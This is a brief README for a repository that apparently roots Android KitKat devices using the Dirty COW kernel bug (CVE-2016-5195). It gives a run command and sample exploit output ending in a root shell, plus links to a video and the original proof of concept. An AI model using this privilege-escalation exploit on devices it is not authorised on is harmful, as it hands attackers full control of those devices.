# DirtyCowAndroid
Repo For Working on Dirty Cow Based Android Root Method    
Currently Linux Only    
Youtube: https://www.youtube.com/watch?v=bzrRWfDOQcM  
    
Should Spawn a root shell on device  
Usage sudo make root  
Output:  
[*] mmap 0xb6f00000  
[*] exploit (patch)  
[*] currently 0xb6f00000=464c457f  
[*] madvise = 0xb6f00000 13708  
[*] madvise = 0 1048576  
[*] /proc/self/mem 0 1048576  
[*] exploited 0xb6f00000=464c457f  
adb shell /system/bin/run-as  
running as uid 2000  
uid 0  
root@ZTE-V811:/ #
  
Tested On Android Kitkat 4.4  
Oringal PoC Code: https://github.com/timwr/CVE-2016-5195
